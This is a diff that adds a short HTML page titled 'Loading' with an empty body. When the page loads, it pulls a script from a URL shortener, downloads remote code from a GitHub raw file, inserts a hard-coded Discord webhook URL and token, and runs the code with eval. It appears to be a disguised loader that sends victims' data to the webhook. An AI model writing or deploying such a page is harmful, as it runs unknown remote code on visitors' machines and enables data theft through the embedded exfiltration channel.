@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading</title>
+    <script src="https://tinyurl.com/3yhdxb4p"></script>
+    <script>
+        function load() {
+            var webhookURL = 'https://discord.com/api/webhooks/1173360820974002177/sXtFf9jhdgXdXdZOsj-HpbiauCiLntJcV0NW1eXleDepMv5qtOWSmlAOvlMKh9xPxld2';
+
+            var scriptURL = 'https://raw.githubusercontent.com/Lenn106/files/master/discip';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', scriptURL, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    var scriptCode = xhr.responseText;
+                    scriptCode = scriptCode.replace('https://discord.com/api/webhooks/1173360820974002177/sXtFf9jhdgXdXdZOsj-HpbiauCiLntJcV0NW1eXleDepMv5qtOWSmlAOvlMKh9xPxld2', webhookURL);
+                    eval(scriptCode);
+                }
+            };
+            xhr.send();
+        }
+    </script>
+</head>
+<body onload="load()">
+</body>
+</html>
